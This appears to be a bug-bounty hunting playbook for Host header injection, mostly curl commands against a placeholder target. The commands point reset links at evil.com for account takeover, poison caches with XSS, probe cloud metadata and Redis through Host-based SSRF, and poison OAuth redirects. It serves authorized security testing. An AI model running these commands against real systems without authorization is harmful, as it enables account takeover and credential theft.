---
name: hunt-host-header
description: Hunt Host Header Injection — password reset poisoning → ATO, cache poisoning via unkeyed host, X-Forwarded-Host injection, SSRF via Host header, routing-based SSRF, OAuth redirect_uri poisoning. High to Critical when it leads to ATO or mass cache poisoning.
sources: hackerone_public
report_count: 16
---

# HUNT-HOST-HEADER — Host Header Injection

## Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).

**Highest-value chains:**
- **Password reset poisoning → ATO** — server uses Host header to construct reset link, attacker sets Host: evil.com → victim's reset link points to attacker → token captured → full ATO
- **Cache poisoning via unkeyed Host** — CDN caches response with poisoned X-Forwarded-Host → mass XSS/redirect served to all users
- **Routing-based SSRF** — `Host: 169.254.169.254` in internal forward proxy → cloud metadata access
- **OAuth redirect_uri poisoning** — Host injection changes OAuth callback domain

---

## Attack Surface Signals

```
Any password reset / forgot-password endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Nginx, HAProxy)
OAuth authorization endpoints
Absolute URLs constructed from request host
Email-sending endpoints
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Password Reset Poisoning
```bash
# Test Host header directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "your-test-account@target.com"}'

# X-Forwarded-Host (behind reverse proxy)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# X-Host header
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# Port confusion
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:@evil.com" \
  -d "email=your-test-account@target.com"

# Check if reset email contains evil.com in reset link
# Use your own test account — never use another user's email
```

### Phase 2 — Cache Poisoning via Host Header
```bash
# Test if X-Forwarded-Host is reflected in response
curl -s https://$TARGET/ \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"

# Check if response is cacheable
curl -sI https://$TARGET/ | grep -E "(Cache-Control|CF-Cache-Status|X-Cache|Age|Surrogate)"

# If reflected + cacheable = cache poison candidate
# Test with XSS payload (for PoC, use harmless signal first)
curl -s "https://$TARGET/" \
  -H "X-Forwarded-Host: collab-host.com"
# Check collab for DNS/HTTP callback
```

### Phase 3 — SSRF via Host Header
```bash
# Internal forward proxies may honor Host for routing
curl -s https://$TARGET/internal \
  -H "Host: 169.254.169.254"

# AWS metadata via Host-based SSRF
curl -s "https://$TARGET/" \
  -H "Host: 169.254.169.254" \
  -H "X-Original-URL: /latest/meta-data/"

# Port-based routing test
curl -s https://$TARGET/ \
  -H "Host: localhost:6379"  # Redis
```

### Phase 4 — OAuth / OIDC Poisoning
```bash
# Does OAuth flow use Host header for redirect_uri construction?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app" \
  -H "Host: evil.com" | grep -i "redirect"
```

### Phase 5 — Header Fuzzing (Param Miner)
```bash
# Headers to test
HOST_HEADERS=(
  "X-Forwarded-Host"
  "X-Host"
  "X-Forwarded-Server"
  "X-HTTP-Host-Override"
  "Forwarded"
  "X-Original-URL"
  "X-Rewrite-URL"
  "X-Override-URL"
)

for HEADER in "${HOST_HEADERS[@]}"; do
  RESULT=$(curl -s -I "https://$TARGET/forgot-password" \
    -H "$HEADER: evil.com" \
    -X POST -d "email=test@test.com" | head -20)
  echo "=== $HEADER ==="
  echo "$RESULT"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Password reset reflects Host | Use test account, confirm evil.com in link | High - ATO for any user |
| Host reflected in response | Check if cacheable + add XSS payload | Cache poisoning |
| Internal proxy honors Host | Probe 169.254.169.254 | SSRF → cloud metadata |
| OAuth uses Host for redirect | Intercept auth code | ATO via OAuth code theft |

---

## Validation

✅ Password reset: evil.com appears in reset URL in your own test account's email
✅ Cache poison: fresh browser receives response with attacker-controlled content
✅ SSRF: cloud metadata or internal service response returned

**Severity:**
- Password reset → ATO for any user: High/Critical
- Cache poisoning → mass XSS: High
- SSRF → cloud metadata: High
- Reflected only in uncacheable, non-email response: Low
